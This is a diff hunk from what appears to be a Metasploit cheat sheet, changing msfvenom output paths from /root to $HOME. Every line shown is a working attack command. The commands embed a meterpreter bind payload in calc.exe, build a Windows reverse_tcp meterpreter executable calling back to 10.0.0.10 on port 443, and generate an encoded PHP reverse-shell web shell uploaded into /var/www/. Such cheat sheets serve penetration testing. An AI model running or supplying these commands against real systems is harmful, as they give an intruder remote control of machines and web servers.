@@ -100,11 +100,11 @@ msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
 msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > calc2.exe
 
 - Generate a reverse payload and save it as an executable
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -f exe -a x86_64 --platform windows -o /root/evil64.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -f exe -a x86_64 --platform windows -o $HOME/evil64.exe
 
 - Generate PHP web shell and upload to a web server
-msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -f raw -a php -e php/base64 -o /root/webshell.php
-upload /root/webshell.php /var/www/
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=443 -f raw -a php -e php/base64 -o $HOME/webshell.php
+upload $HOME/webshell.php /var/www/
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Sessions
